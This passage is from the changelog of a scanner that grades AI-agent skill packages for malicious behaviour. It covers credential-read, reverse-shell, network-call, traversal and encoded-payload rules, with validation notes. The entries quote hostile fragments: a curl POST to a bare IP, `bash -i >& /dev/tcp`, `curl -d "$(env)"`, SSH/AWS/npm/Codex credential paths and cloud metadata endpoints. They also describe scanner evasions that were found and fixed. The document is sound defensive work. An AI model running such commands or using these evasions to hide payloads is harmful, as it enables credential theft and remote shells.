# Changelog

## Unreleased

- **#36, grade-changing:** SD-002 permits one U+FE0F emoji presentation
  selector before a ZWJ between already-recognized emoji codepoints. The
  family/rainbow-flag reproducer and heart-on-fire emoji now receive security
  A instead of F. The four-joiner per-line cap, emoji codepoint set and
  detection of other invisible characters are unchanged. This remains a
  bounded heuristic, not full Unicode emoji-sequence validation.
- **ST-126, grade-changing:** SD-004 detects content reads/disclosures of
  `~/.npmrc` and `~/.codex/auth.json`, also spelled with `$HOME/` or `${HOME}/`.
  Direct prose requests, file-reader/copy commands, input redirection and
  selected Python/JavaScript read expressions supply access evidence; a bare
  filename, login/setup instruction or metadata check does not. Exact file
  boundaries keep `.npmrc.example` and `auth.json.schema` out of this addition.
  Existing scope gates, documentary/negation exemptions and older path entries
  are unchanged. This remains line-local matching, not shell interpretation,
  cross-line data flow or proof that a credential exists. Fixtures are scanned
  as text, never executed; no referenced home credential is opened.
- Validation against **v0.10.0**: two synthetic malicious packages, each with
  one prose request and one hook-script read, move from **0/4 to 4/4** SD-004
  findings and from `permission_hygiene A` to `F`. All **11 clean packages**
  (10 existing, one new setup/control package) remain at **0 findings**.
  Unit coverage adds 20 access and 26 benign templates, each across two stores,
  three home spellings and 12 instruction/hook paths. These are constructed
  regression checks, not estimates of real-world recall or false-positive rate.
- Review regressions: LF and CRLF requests behave identically. `grep` search
  patterns (including `-e`/`--regexp`) are not file reads, while input files,
  `-f`/`--file` and executable command substitutions remain detectable. Paired
  full-scanner tests assert `permission_hygiene A` for literal patterns and `F`
  for reads. Both tests fail under the corresponding deliberate mutations.
  `grep FILE -e PATTERN` and `grep FILE --regexp=PATTERN` keep FILE classified
  as input. Escaped `\$(cat …)` and `$(basename …)` in search patterns are not
  credential reads; executable substitution bodies are checked separately.
  Operand masking starts at command positions: a filename named `grep` in
  `cat grep ~/.npmrc` cannot hide the read. `jq --arg`/`--argjson` names and
  values are data, while file inputs and executable substitutions still count.
  Literal `echo`/`printf` arguments are not reader commands. Interleaved `>`
  and `>>` output destinations are excluded without hiding later input files;
  adjacent numeric descriptors do not consume grep patterns or jq arguments.
  Input redirections and executable substitutions remain access evidence.
  `Run`/`Please run` introductions retain command operand classification.
  Positional jq filters are distinct from input filenames, including when
  options precede the filter; `-f`/`--from-file` keep file-backed reads visible.
  Bulleted and numbered Markdown commands retain operand classification.
  Ordinary multi-source `cp`/`scp`/`rsync` commands check every source and
  exclude the final destination; extended option forms retain the existing
  matcher. Here-string (`<<<`) operands are data, not input filenames;
  executable substitutions inside them are still checked independently.
  JavaScript read expressions bind to the first literal filename argument,
  not later literals in a chained call. Unquoted shell-comment boundaries
  end operand masking; their instruction text is checked independently.
  Whitespace-free executable backticks stay separate from literal Markdown
  path spans. Quoted longer filenames do not match credential-file prefixes.
  `sed`/`awk` literal programs and variable arguments are not file inputs;
  input files, file-backed programs and explicit read/execute constructs
  retain access evidence. This does not interpret arbitrary program logic.
  Read/execute fragments cannot release unrelated literals in the same
  program. Recognized file operands are checked as whole filenames, including
  quoted names with spaces; metadata arguments cannot manufacture readers.
  AWK comments and strings are not executable evidence; selected AWK read and
  execute arguments must be unescaped literals, without expression evaluation.
  Valid JSON strings are decoded before the new-path checks, so quoted copy
  sources and grep patterns in hooks behave like their shell equivalents.
  Findings retain their original JSON file/line and negation-test offsets.
  Decoded LF/CRLF command lines are checked individually. Nested substitutions
  and Markdown command spans receive the same grep operand checks as top-level
  commands. A single lexical partition keeps child text out of ancestor scans;
  tests bound total region size and check both reads and non-reads at depth
  4,000. Nested non-read benchmarks at depths 100/200/400 took approximately
  0.9/1.9/3.5 ms (previously 26/105/429 ms); depth 4,000 took 36 ms.
  Complete access expressions replace repeated prefix matching, avoiding
  quadratic work on repeated filenames. On the review orb, 2,000 non-access
  mentions (28 KB) take about 11 ms instead of 7.62 s; 50,000 (700 KB) take
  about 266 ms. These timings are local benchmark observations, not an SLA.
- Independent baseline comparison: 131 existing fixture packages and 20
  [public skill roots](https://github.com/anthropics/skills/tree/34040c9c568585f6929bedeaad110ad08f079624)
  retain identical JSON results, stderr and exit codes in default and
  `--scan-all` modes. Only the two new malicious packages change. Structured
  property tests and bounded fuzzing cover copy source/destination roles,
  exact-path suffixes, JSON escaping and physical locations. Performance
  checks exposed unnecessary parsing of token-free JSON; early path checks
  and direct JSON-string boundary scanning remove that work without skipping
  escaped credential paths. Reproducible comparison benchmarks are included.
- Store evaluation (2026-09-21): [npm documents](https://docs.npmjs.com/cli/v11/configuring-npm/npmrc)
  both registry configuration and authentication fields; [Codex documents](https://developers.openai.com/codex/auth)
  file-backed `auth.json` as well as OS credential storage. Neither file is
  assumed to exist or always hold a secret. [Claude Code's documented](https://code.claude.com/docs/en/authentication)
  `~/.claude/.credentials.json` already matches the legacy `.credentials`
  entry; this change does not redesign its exemptions. [OpenCode's documented](https://opencode.ai/docs/providers/)
  `~/.local/share/opencode/auth.json` remains unsupported. [Gemini CLI's auth guide](https://geminicli.com/docs/get-started/authentication/)
  describes local caching without specifying its filename; no Gemini store
  coverage is claimed here. OS keychains, relocated stores (`CODEX_HOME`, XDG
  overrides), absolute-home and Windows spellings are not added.
- Registry checksum unchanged at `2414c32f04000b5d` (25 rules); schema unchanged
  at `1.5`. No release or downstream dependency pins changed.

## v0.10.0 — 2026-08-30

**Grade-changing.** A package that reads `$HOME/.ssh/id_rsa`,
`${HOME}/.aws/credentials`, `$HOME/.gnupg/...` or `$HOME/.env` used to grade
`permission_hygiene A` and now grades `F`. Nothing about the package changed:
SD-004's path list held only the `~/`-spelled form, so the identical read
written through the home-directory variable was invisible. If your grade
moved on this release, the finding was always true and the engine could not
see it.

- SD-004 matches the four home-rooted credential paths (`.aws/`, `.ssh/`,
  `.gnupg/`, `.env`) in three spellings — `~/`, `$HOME/`, `${HOME}/`. The
  finding description names the spelling actually written; a line that
  already matched on `~/` produces a byte-identical description to before
  this release.
- The `.pub` exemption and the documentary damping are unchanged and cover
  the new spellings with no engine change: both judge the line's text, never
  the path's spelling. The negation damping is different — it is a position
  test against the leftmost occurrence of the path on the line, so it is
  spelling-aware by construction, and a leftmost-offset fix landed alongside
  this change is what makes that the right offset to test.
- Windows spellings (`$env:USERPROFILE\`, `%USERPROFILE%\`) were evaluated
  against an internal corpus and deliberately NOT added: the lines they
  matched are not credential access.
- Validated against an internal corpus. The change adds a small number of
  findings on both labels and moves **no sample across a
  `permission_hygiene` or `security` gate in either direction**. The one
  hostile sample it closes was already `permission_hygiene D`; the one honest
  sample it costs was already `permission_hygiene F` from a pre-existing
  `~/.ssh/` finding.
- Registry checksum unmoved at `2414c32f04000b5d`; schema unmoved at `1.5`.

This release also carries the adversarial corpus standing gate (PR #27, merge
`8fc81ce`), merged to `main` on 2026-08-30 and
deliberately left unreleased on its own: it has zero hunks under `pkg/`, so
it changes no engine behaviour by itself. It ships now bundled with the
SD-004 fix above rather than as a separate patch release.

## v0.9.0 — 2026-08-28

Two behaviour changes, one release. Neither moves the registry checksum, which
stays `2414c32f04000b5d` (25 rules) — **grades can still move**, because both
changes alter what gets scanned and what counts as a finding, not the rule set
itself. Read both entries before upgrading a pinned consumer.

### A `skill.yaml` directory is a skill root too

v0.8.0 made any directory containing a `SKILL.md` a skill root and scanned its
whole subtree. It recognised `SKILL.md` alone, so a payload sitting beside a
`skill.yaml` stayed out of scope while the manifest above it was read.

That was not a blind spot the tool admitted to. `skill.yaml` **is** a
recognised agent file, so the scan had a non-empty agent surface, the
`NoAgentSurface` warning never fired, and the tree earned a confident `A`:

```
v0.8.0   security=A  files=1   ✓ No concerns · no network · no shell
now      security=F  files=2   ⚠ 2 behaviors detected  (SD-007, SD-009)
```

"no network" and "no shell" were affirmative claims about a file the scanner
never opened. **Your grade may move again** if you ship a `skill.yaml`-declared
skill with scripts beside it — the same way it may have moved in v0.8.0, and
for the same reason.

The marker set is now *the manifest set* — exactly what `rules.IsSkillManifest`
has always accepted. The root marker and the manifest definition disagreeing is
what produced the gap; defining one in terms of the other is what stops it
coming back.

Priced by construction rather than by corpus: no sample in the validation
benchmark has the gap shape, so the bench re-run is byte-identical to
v0.8.0. Zero prevalence is evidence the change is cheap, not evidence the gap
was harmless — an evasion is valuable to an attacker precisely because it is
absent from the corpus defenders measure against.

Still open, deliberately: the marker match is case-sensitive, so `skill.md` and
`Skill.MD` create no root. Those fail **safe** — no grade, plus the "nothing was
checked" warning — which is what separates them from the case fixed here.

Registry checksum unchanged at `2414c32f04000b5d`; schema unchanged at `1.5`.

### Fixed

- **SD-003** no longer reports an in-package `../` reference as directory
  traversal. The `../` branch now resolves the reference against the file's
  own skill root (`FileContext.SkillRoot`) instead of
  pattern-matching it: a reference that never takes the walk below that root
  is released. Still flagged: anything that genuinely escapes the root,
  anything behind a variable prefix (`$HOME/../..`, `${ROOT}/../..`) whose
  target cannot be resolved at scan time, the `....//` / `..././` spellings
  that survive a sanitiser stripping one `../`, and **any line the scanner
  cannot read unambiguously**. That last clause is the one to read before
  filing a false positive: every character the tokeniser cuts a line on is
  also legal inside a POSIX filename, so a line whose `../` region carries
  one of them — a glob, a comma, a space, a tab, `(`, `)`, `<`, `>`, `;`,
  `|`, `&` — admits two readings, and only a single unbroken reference is
  ever released. Practically: `cat ../data/*.json` stays flagged, and so
  does `ln -sf ../data d && ln -sf ../logs l`, which names two in-package
  references on one line. The alternative is releasing
  `../a(b)c/../../outside/harvest.env`, which leaves the skill root.
  Also still flagged: a path segment that **contains** `..` without being
  exactly `..` — `file@../../../outside/x`, `0x123.../videos/intro.mp4`.
  A sigil or separator glued to a `..` cannot be told apart from an ordinary
  directory name, and reading it as one costs two levels of climb.
  The absolute-path and Windows-path branches are unchanged — every
  candidate evaluated against them was rejected. The predicate
  reads `/`-separated paths, so it is inert on Windows and SD-003 behaves
  there as it did before.

  **Validated against an internal corpus.** SD-003 findings fall on honest
  input and are essentially unmoved on hostile input; two honest samples come
  off a `permission_hygiene` gate and no hostile sample in the slice moves. The
  whole-reference rule was added after that run and re-measured on the same
  population, so the shipped behaviour is the measured one.

  That rule is not free: one honest sample moves `permission_hygiene`
  **A → D** on a doc-comment line naming a glob (`* - ../agents/*.md`), and one
  hostile sample already graded D gains one finding. No exit code moves. The
  cost sits below what the smaller measurement slice can resolve, which is why
  an earlier draft of this entry reported it as zero.

  **Headline: recall untouched, precision marginally up.** Note that metric
  is a **composite** over `security` / `permission_hygiene` / `transparency`,
  which is why a `permission_hygiene`-only change moves it; the
  `security`-axis-alone gate is unmoved, because `pathTraversalRule` never
  stamps that axis.

## v0.8.0 — 2026-08-27

### Skill root scope — raw and installed layouts now grade identically

**Any directory containing a `SKILL.md` is a skill root, and its whole
subtree is now in scope**, wherever that directory sits — at a repository's
root, nested arbitrarily deep, or under `.claude/skills/`. Before this
change, scope was decided purely by path shape (`SKILL.md`, `CLAUDE.md`,
`.claude/...`), which made a skill directory sitting plainly in a repository
(`raw` layout) a strictly narrower scope than the identical directory
installed under `.claude/skills/` (`installed` layout) — the manifest above
a payload was read either way, the payload itself only when installed.

**Your grade may move.** A repository that graded A may now grade D,
because a payload in `scripts/` beside a `SKILL.md` is now read where
before only the manifest above it was. That is the point of the change,
not a regression.

**Registry checksum unchanged** at `2414c32f04000b5d` (25 rules) — this is
file-class logic, not rule registration. **JSON schema unchanged** at `1.5`
— `model.FileContext` gains `SkillRoot string` (additive, not part of the
wire format: `FileContext` has no JSON tags and isn't reachable from
`ScanResult`).

**Validated against an internal corpus.** Recall on the `raw` layout rises
substantially; `installed` is byte-identical in every measured cell. The two
layouts then converge **exactly**: no sample differs in security grade, in any
axis grade, or in finding set. Every finding newly visible on `raw` already
existed in `installed`'s finding set before this change — the precision cost
is `installed`'s existing false-positive rate becoming visible on `raw`, not
new debt. Of the honest samples whose security-axis findings newly cross the
gate, the large majority are noise (a rule misreading documented behaviour)
and one is a genuine, defensible catch of real masquerading/persistence
techniques.

**Stored scans are not silently re-graded.** Existing gallery entries and
stored scan results were measured by an older engine and stay as they are,
labelled with the engine version that produced them. Re-scanning happens on
the normal refresh path, not as a migration, so nobody's badge changes
without a scan they can point at. `skilltrust` owns surfacing the engine
version beside a stored grade; that work is tracked there, not here.

`node_modules`, `vendor`, `dist`, `build`, `target`, `.next`, `.git` stay
excluded — the hardcoded skip-dir list sits above the new skill-root logic,
so a `SKILL.md` inside any of them creates no scope root. User-level
installs (`~/.claude/`) remain out of scope — separate work.

### SD-025 Reverse Shell (new rule)

Added **SD-025 Reverse Shell** — Critical, security axis, category `"Reverse
Shell"`. The first rule in the engine to detect a socket bound to a shell.

**Registry checksum MOVED** `589619b6386d2c41` → **`2414c32f04000b5d`**
(24 → 25 rules). This is the first checksum move since v0.6.0. A consumer keyed
on the checksum (e.g. `skilltrust`'s triage cache) invalidates — that
is correct, the ruleset genuinely changed. On release, all three downstream pins
move: `scan-action/action.yml`, `skilltrust/go.mod`, skilltrust's CI fixture
clone (`make versions` is the gate; runbook: `release.md#downstream-propagation`).

**JSON schema unchanged** at `1.5` — SD-025 adds no wire field.

`expectedChecksum` is not pinned; the value above is recorded here as
the fingerprint, not a gate.

**What it detects.** The carrier is *a socket and a shell in the same program*,
not a list of literal one-liner forms. Two paths: a single line that
is already socket+shell (`nc -e`, an interactive shell redirected onto
`/dev/tcp|udp`, a `mkfifo`/`openssl s_client` relay), or a low-level socket
library call and a shell-exec primitive both present in one file — the multi-line
python/perl/php/node/powershell payloads of that shape.
Previously all of `bash -i >& /dev/tcp/…`, the python `socket`+`dup2`+`pty.spawn`
one-liner, and the `mkfifo`+`openssl` relay graded A; only `nc -e` fired, and only
incidentally via SD-007.

**Validated against an internal corpus.** False positives on honest input do
**not** rise on either layout, and reverse-shell recall rises on both. On the
full pool SD-025 is the **sole** reason security crosses the gate (worse than
B) for a substantial number of hostile samples — **with no new honest crossing
on either layout across the pool** (the few honest files it fires on were
already flagged by another security rule). The predicate separates the two populations
strongly; its residual false positives are security and sysadmin reference docs
that quote revshell payloads verbatim.

**Grading changes; builds that passed can fail.** A repository shipping a reverse
shell in an installed skill now grades security F where it graded A. If a build
starts failing on this change, the finding is real — read it before pinning back.

Also surfaced while building the negative fixtures: `nc -zv host port` port scans
grade security D via a pre-existing SD-007 behaviour (bare `nc` matches its
network-command regex; SD-007 only demotes when a URL is present). Unrelated to
SD-025, logged for the SD-007 false-positive backlog.


## v0.7.0 — 2026-08-26

The first release since `v0.6.0` (2026-08-14) and a large one: eleven commits
carrying a measurement-driven precision programme, a scope fix, an
empty-scan-honesty fix, and a rework of `networkCallRule`'s demotion policy.
Read the two warnings below before upgrading.

**Registry checksum unchanged** at `589619b6386d2c41`. Every rule change in
this release is match-time logic — no rule's registered `(ID, Name, Severity,
Category, Axis)` moved — so a consumer keyed on the checksum (for example
`skilltrust`'s triage cache) does not invalidate.

**JSON schema `1.4` → `1.5`**, additively: `ScanResult` gains
`no_agent_surface`. See the second warning.

### ⚠️ This release changes grades. Builds that passed on v0.6.0 can fail.

No new rule was added and the checksum did not move, but detection genuinely
improved and a CI gate is a threshold over grades. Validated against an
internal corpus at `--fail-on-axis security=B` (security axis alone, strictly
worse than B): recall rises on both the installed and raw layouts, at a small
cost in newly-failing honest samples. If a repository's build starts failing on
this upgrade, the finding is probably real — read it before pinning back.

### ⚠️ A scan that checked nothing no longer reports a grade

Previously, a repository with no `SKILL.md`, no `CLAUDE.md`, no `.claude/` and
no `.agents/` was graded **A across the board**, because no rule fired and no
rule can fire on a file no rule reads. That is a false assurance, and it is now
a distinct state: `ScanResult.NoAgentSurface` is `true`, `Axes` is empty, and
the text verdict reads `∅ Nothing checked` instead of `✓ No concerns`.

**Consumers must not store or display this as a passing result.** A consumer
that reads "no axis grades" as "no problems" reproduces the bug one layer up,
in whatever it renders. The exit code is unchanged (`0`, since there are no
findings) — branch on the field, not on the code.

### Fixed (SD-007 demotion policy, 2026-08-26)

- **A statement is demoted only when it is nothing but its call.**
  `networkCallRule` suppressed a security finding by asking whether the
  statement did any of a *list of dangerous things*. A deny-list has to
  enumerate every dangerous thing a statement can do, fails open on
  everything it forgot, and ships in a public repo where an attacker reads
  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block a
  reverse shell chained after an `echo` graded **security A**, while the
  identical line in a `run.sh` graded **D** — the whole difference was
  `isDocFile`. Two more holes on the same rule: `suspiciousEndpoint` was
  applied to the *first* URL of a statement only, so
  `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
  graded A and the reverse order graded D; and a call on a backslash
  continuation inside a doc file was never scanned at all, because the call
  regexes read the first line while the demotion judged the joined
  statement. None of the three ever shipped — v0.6.0 predates the release
  that introduced them.

  The replacement is an allow-list of **form**: demote only when the
  statement is one call, its flags and its target — no `&&`, `;` or pipe,
  and no `$(` unless it is the statement's own capture assignment
  (`DATA=$(curl …)`). It fails **closed**: anything the predicate does not
  recognise keeps its registered High/`security`. Applied at every demotion
  site, so a guard cannot be added to one and missed at another.

  Each veto element was evaluated separately against an internal corpus on
  the currently-demoted population before being included or dropped.
  Included: the chain operators `&&`/`;`, a pipe, and `$(` everywhere except
  the capture-assignment head. Dropped as running the wrong way: a backtick
  (its honest side is markdown inline code, not substitution), a background
  `&`, and a redirection. A carve-out for a pipe into a pure formatter
  (`curl … | jq .`) was evaluated and **not** shipped.

- **A bare routable IP literal in prose is no longer silent.** The third
  demotion site is the doc-file branch of the bare-URL fallback, and it
  needed its own measurement rather than the same predicate: escalating on
  `suspiciousEndpoint` in full is noise on both sides of the label —
  `http://localhost:8080/` as an OAuth redirect URI, over and over. Narrowed
  to a *globally routable* IP literal, the same population is a handful of
  hostile findings and **zero** honest ones.

  Validated against an internal corpus at `--fail-on-axis security=B`
  (security axis alone, strictly worse than B): recall rises on both layouts
  with precision essentially flat. Registry checksum unmoved at
  `589619b6386d2c41` — all match-time logic.

- **An adversarial fixture corpus, committed and asserted**
  (`cmd/skill-detector/testdata/adversarial/`). None of the shapes above
  exists in the measurement corpus, so a bench re-run is byte-identical
  whether they pass or fail. Corpus measurement prices what a suppression
  *costs*; only constructed cases price what it costs to leave one open.
  Cases are whole skill packages and the test asserts a **minimum grade on a
  named axis** — what regressed was the grade a user sees, and a rule-level
  assertion passes happily while a finding is demoted onto an axis nobody
  gates on. Four control cases assert the cost side stays demoted.

  A second table records three shapes **no rule detects**: `bash -i >&
  /dev/tcp/…`, an inline python `socket`+`pty` payload, and the perl
  `Socket`+`exec` one-liner. SD-007 only ever saw them because a URL
  happened to share the line. That test asserts they are undetected and
  fails when that changes. The engine has no reverse-shell rule; adding one
  registers a new ID and moves the ruleset checksum, so it is a release
  step, not a bugfix.

### Changed (engine precision programme, 2026-08-26)

Measurement-driven follow-on to the SD-007/SD-008 work below: one rule
change per class actually measured to separate malicious from benign, one
class per entry left alone with the evidence that says why. Registry
checksum unmoved at `589619b6386d2c41` throughout — every change here is
match-time logic, not a registered `(ID, Name, Severity, Category, Axis)`
field.

Validated against an internal corpus at `--fail-on-axis security=B`,
installed layout — the gate metric here is the **security axis alone**, which
is what that flag tests. Precision improves slightly and **nothing on the
hostile side moves**: behaviour-class recall is unchanged to four decimal
places and the hostile finding count is identical.

- **SD-002: a ZWJ directly between two emoji codepoints is not a hidden
  payload** (`d3c2c92`). `isInvisibleRune` correctly treats U+200D ZERO
  WIDTH JOINER as payload-carrying in general, but nearly every honest
  SD-002 finding in the validation corpus was an ordinary compound emoji —
  🧙‍♂️, 👨‍🍳, 👨‍🏫, 🧑‍🚀 — that Unicode renders as one glyph using exactly that
  codepoint. New carve-out: an invisible rune is exempted from the count
  when it is a ZWJ with a pictograph on **both** sides — a codepoint in one
  of five named pictograph blocks (`U+1F300–U+1F5FF`, `U+1F600–U+1F64F`,
  `U+1F680–U+1F6FF`, `U+1F900–U+1F9FF`, `U+1FA70–U+1FAFF`), or one of an
  explicit 10-codepoint set of symbol-block modifiers that Unicode's RGI
  role/profession sequences actually pair with (`U+2640`, `U+2642`,
  `U+2695`, `U+2696`, `U+26A7`, `U+2602`, `U+2620`, `U+26D1`, `U+2708`,
  `U+2764`). Two wider first versions were cut in review: the whole
  `U+2600–U+27BF` block, which also holds ordinary prose furniture (check
  marks, scissors, arrows), and the single span `U+1F300–U+1FAFF`, which
  swallows the Ornamental Dingbats, Alchemical, Geometric-Shapes-Extended,
  Supplemental-Arrows-C and Chess blocks — a ZWJ between two chess pieces
  was exempt (`1d170ad`). The exemption is applied per rune, not only to a
  line carrying a single invisible rune, and at most `maxExemptZWJPerLine`
  = 4 per line qualify; past that none are exempted and the whole line
  counts as before, which is what keeps the carve-out from becoming an
  unbounded covert channel. A ZWSP/ZWNJ (not ZWJ), and any invisible
  rune without a pictograph on both sides, fire exactly as before — those
  separate cleanly. A hard gate was required before shipping: the carve-out
  fires on **zero** hostile SD-002 findings, not merely a favourable ratio.
  Validated against an internal corpus: SD-002 findings on honest input fall
  sharply, and the hostile side and behaviour-class recall are completely
  unmoved. A candidate predicate for the originally-targeted class
  (documentary/prose injection) was also evaluated, found to be a provable
  no-op on both populations, and closed with no engine change.
- **SD-004: `.credentials` no longer matches inside an unrelated dotted
  identifier chain** (`13a2505`). `credentialPaths`' `.credentials` entry
  was a bare `bytes.Contains` substring test with no word boundary, so it
  fired on `from google.oauth2.credentials import Credentials`, on a
  markdown field-doc bullet (`broker.credentials.apiKey: ...`), and on an
  SSH **public** key path (`~/.ssh/id_ed25519.pub` — the `.pub` suffix
  marks it non-secret). Three narrow, measured exemptions ship — Python
  import statements, markdown field-doc bullets naming a credential field
  without accessing it, and `.pub`-suffixed SSH paths — an ambiguous
  identifier-chain access (`args.credentials`) and a genuinely documentary
  line inside a skill whose stated purpose is vetting other skills both
  stay flagged, on purpose. All three candidate predicates the plan
  proposed matched **none** of the honest hits before this — reading those
  lines directly is what found the actual bug. Validated against an internal
  corpus: SD-004 findings on honest input fall sharply, at zero cost on the
  hostile side. SD-004 grades
  `permission_hygiene`, so none of this moves the `security=B` gate.
- **Every one of those three exemptions is vetoed on a line that acts**
  (`53c0f78`, `279aa69`, `1d170ad` for the SD-002 sibling). Each exemption
  recognises a *shape*, and a shape ships in a public repo where an
  attacker reads it. So: a doc-bullet or public-key line that also runs a
  command loses its exemption (the veto list is `reShellInvocation` plus a
  reader-verb set — `head`/`tail`/`less`/`awk`/`sed`/`grep`/`xxd`/
  `strings`/`od`/`open`/`pbcopy`/`env`/`printenv`); an import clause with
  anything appended after it no longer matches; and a `.pub` line naming a
  second, private key does not read as all-public, including when that
  second path is spelled `$HOME/.ssh/` or `${HOME}/.ssh/` and no command
  appears on the line at all. The variable spellings are deliberately
  **not** added to `credentialPaths` — recognising a token so the
  exemption stops applying is a different question from detecting it, and
  the detection widening is its own separately measured change. Every hole
  is pinned by a regression test naming the bypass it closes.
- **The SD-004 widening is kept out of the regex SD-013 shares**
  (`e42b9da`). The reader verbs above live in their own regex with exactly
  one caller, because `reShellInvocation` is also SD-013's documentary
  veto: a reader verb reaching it re-flags ordinary threat-model questions
  ("Could it grep .zshrc to check settings?") as CRITICAL persistence.
  `TestReaderVerbsAreNotInSharedShellInvocationRegex` fails the moment
  someone merges the two lists.
- **SD-007's printed-URL demotion — implemented, measured, and dropped.**
  A `print(url)` / `console.log(url)` / `echo $url` statement discloses a
  target rather than reaching one, and demoting it to
  Medium/`transparency` evaluated well as a predicate. It is not in this
  release: the benefit was two honest samples, and review found four
  constructible bypasses inside it — a
  printed URL sharing a line with a reverse shell (`bash -i >&
  /dev/tcp/...`, a `python3`/`perl` socket-exec one-liner, or an
  `Invoke-WebRequest` download) rode along on the demotion and took the
  sample from D to A. The three demotion sites in `networkCallRule` are
  being reworked together as one policy — demote only when the statement
  is nothing but the call and its URL — instead of extending a deny-list
  of dangerous verbs that an attacker can read.
- **SD-003 `/tmp`/`/var/folders` workspace-path exemption — measured and
  rejected, no engine change.** The proposed exemption would carve out
  paths malware uses at a *higher* rate than honest skills do on the
  absolute-path branch (real cryptominer/SUID-bash payloads staged in `/tmp`,
  against ordinary report-writing at the same path prefix). SD-003's honest
  findings (`permission_hygiene` axis, not read by `--fail-on-axis
  security=B`) are unchanged; this is a measured no-op, not a deferral.
- **SD-007 class 1 (a skill calling its own API from its own script) and
  SD-009's installer-domain allowlist — both measured and rejected, no
  engine change.** SD-007: `host also named in SKILL.md` fires at
  effectively the same rate on both labels — no separation. SD-009: the
  plan's guessed domain list matches no real honest finding; the actual
  honest domains (`cli.inference.sh`, `foundry.paradigm.xyz`) also cover
  hostile findings hiding behind the same vendor domain, and even
  where the predicate is unambiguous, demoting Critical→Medium only moves
  the affected benign samples from security F to C — still failing
  `--fail-on-axis security=B` — so it wouldn't have changed the gate
  outcome regardless.
- **Grade scale reachability — documented, no code change.** The stale
  worklist item ("B is unreachable, map something to Low or say A/C/D/F")
  was already false: the SD-007 declared-endpoint demotion (below) puts a
  Medium finding on `transparency`, which the cap table maps to B. The
  scale actually produced: A/C/D/F on security and permission_hygiene, A/B
  on transparency (C/D unreachable there by construction — no rule ever
  emits High/Critical on transparency), A-only on quality (no rule assigns
  that axis). No rule anywhere emits Low or Info severity. Registry
  checksum unmoved — this is a documentation correction, not a cap-table
  edit.

### Changed
- **SD-007 tells a declared endpoint from a call.** In a documentation or
  data file a URL is a disclosure — a Notion skill's manifest naming
  `https://api.notion.com/v1/pages` is saying what it talks to, not doing
  something wrong — and it now grades **Medium on `transparency`** instead of
  **High on `security`**. It stays High/security when the statement sends
  local state (`curl -d "$(env)"`), when the host is one a published API would
  not use (bare IP, non-standard port, ephemeral tunnel or request-bin), when
  the target is not visible, and always inside executable code. The URL is now
  read from the whole shell statement, so a target on a backslash continuation
  is seen. Registered severity stays High/security — that is the ceiling and
  what `registry.Checksum()` hashes, so the checksum is unmoved.
- **SD-007 no longer matches the English verb "fetch".** `\bfetch\s+` fired on
  "a script to fetch live data" and "not visible to fetch". The JS `fetch(...)`
  call and shell `fetch https://...` still fire.

  Validated against an internal corpus at `--fail-on-axis security=B`, skills
  scanned as installed: precision rises and the false-positive rate falls,
  with a small drop in recall on code-level behaviours. Almost every hostile
  sample that stops being flagged was held up by SD-007 alone, most of those
  by the prose verb; the few real ones are privilege-escalation *instructions*
  in a manifest, which SD-002 should catch deliberately rather than SD-007
  catching by accident.
- **A truncated statement no longer hides the line after it.** `shellStatement`
  stops joining at 8 lines; it reported having consumed one line more than it
  wrote, so the caller skipped a line nothing had scanned. Eight
  backslash-continued lines were enough to hide a `curl` from SD-007 entirely.
  A detection bypass introduced by the de-duplication fix below, found in
  review before either shipped.
- **`curl -T` / `--upload-file` / `wget --post-file` count as sending local
  state, judged by the argument rather than by the command.** These flags take
  a bare path, so they cannot match the `@file` shape. Deciding whether one
  belongs to curl (GNU wget's `-T` is `--timeout`) took three attempts that
  were each wrong about shell syntax in a new way — a newline inside a joined
  statement, an `&` inside a quoted query string, the word "curl" in a trailing
  comment. The rule no longer asks: the argument is a file (`~/…`, `/…`,
  `./…`) or a timeout (digits), and testing that needs no idea where a command
  begins — including when the path is written through a variable, where the
  slash after it is what separates `$HOME/.aws/credentials` from `$TIMEOUT`.
  `curl -T data.json` — a bare relative filename — no longer counts, which is
  the one shape given up for removing the whole class. `-d @data.json` still
  does: the `@` marks the argument as a file to read, so nothing is ambiguous
  there.
- **A bracketed IPv6 host survives URL extraction.** `reHTTPURL`'s character
  class excludes `]`, so `http://[fd00:ec2::254]/latest/meta-data/` — the AWS
  metadata service over IPv6 — was cut at the bracket, and the address never
  reached the host test that would have kept it on the security axis. The IPv4
  form of the same endpoint was always caught. Harmless while every match took
  the registered severity; it decides the axis now.
- **Internal-only and packed hosts count as suspicious.**
  `metadata.google.internal`, a bare `metadata`, anything under the `.internal`
  private TLD, and the numeric spellings of an IPv4 address that
  `net.ParseIP` rejects (`2130706433`, `0x7f000001`). A published API does not
  live at any of them, which is the criterion the bare-IP and port tests
  already apply — these are the hosts that carry a name or an unusual base.
- **`-d @-` is stdin, not a file**, so a heredoc body is no longer read as an
  upload. A quote between the `@` and the path (`-d @"/etc/passwd"`) is
  stripped, since the shell strips it identically to `-d "@/etc/passwd"`.
- **A short option's value may be attached.** curl parses `-d@FILE` exactly as
  `-d @FILE` (verified against curl 8.7.1: both fail with "error encountered
  when reading a file", where a literal body reaches the connection attempt).
  Requiring a separator made the whole check a one-character evasion.
- **The body-flag list is complete**: `--data-ascii` was missing, and wget's
  `--post-file=` — its equivalent of `curl -T` — is now covered too.
- **An `@` inside a literal request body is no longer read as a file upload.**
  `-d '{"email":"user@example.com"}'` matched the upload idiom and kept the
  finding at High. The `@` now has to open the argument or a `field=` value.
- **A statement's continuation lines are no longer re-judged as statements.**
  SD-007 read the URL from the backslash-joined statement but did not skip the
  lines it consumed, so a wrapped command produced one finding per line —
  three for a single call. Found in review of this PR; it removed a small
  number of duplicate findings, few enough not to move the entry above.
- **`curl -d @file` counts as sending local state again.** `exfiltratesLocalData`
  returned early unless it saw `$(`, so the `@`-prefixed upload idiom —
  `-d @path`, `--data-binary @path`, `-F field=@path`, the form the repo's own
  canonical SD-007 fixture uses — was demoted to transparency in documentation.
  Found in review of this PR.
- **SD-008 no longer treats every long alphanumeric run as a payload.** `/` is
  in the base64 alphabet, so a deep path matched; so did a hex wallet address
  and any single-case identifier. Worst of all, npm lockfile `"integrity"`
  values matched — a large volume of findings on honest skills against
  **zero** on hostile ones. The inline branch now requires the token to look
  encoded (mixed case
  plus a digit or `+`/`/`, and not a path shape) and damps subresource-integrity
  and hex-literal lines. The decode-call branches (`base64 -d`, `atob`,
  `b64decode`) are untouched — that is where the signal was all along.

  Validated against an internal corpus: SD-008 findings on honest input fall
  by an order of magnitude. The exemption for path-shaped tokens is a
  case-stability test, not a slash test: `/` is in the base64 alphabet, and
